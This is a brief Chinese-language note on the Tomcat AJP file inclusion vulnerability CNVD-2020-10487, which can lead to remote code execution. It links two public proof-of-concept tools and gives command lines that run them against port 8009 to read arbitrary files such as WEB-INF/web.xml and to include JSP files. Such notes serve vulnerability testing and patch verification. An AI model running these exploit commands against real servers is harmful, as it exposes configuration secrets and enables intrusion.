Tomcat被曝出文件包含漏洞或导致RCE  

2020.02.21-CNVD-2020-10487-Tomcat-Ajp-lfi  

现在有两个poc     
1.参考链接（https://github.com/0nise/CVE-2020-1938）  
任意文件读取  
```java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp```  
文件包含  
```java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 jsp /index.jsp```  
截图如下  
![漏洞截图](../pic/concurrent/aa.jpg)    
2.参考链接（https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi）  
任意文件读取
```py -2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml```
![漏洞截图](../pic/concurrent/aa.jpg)



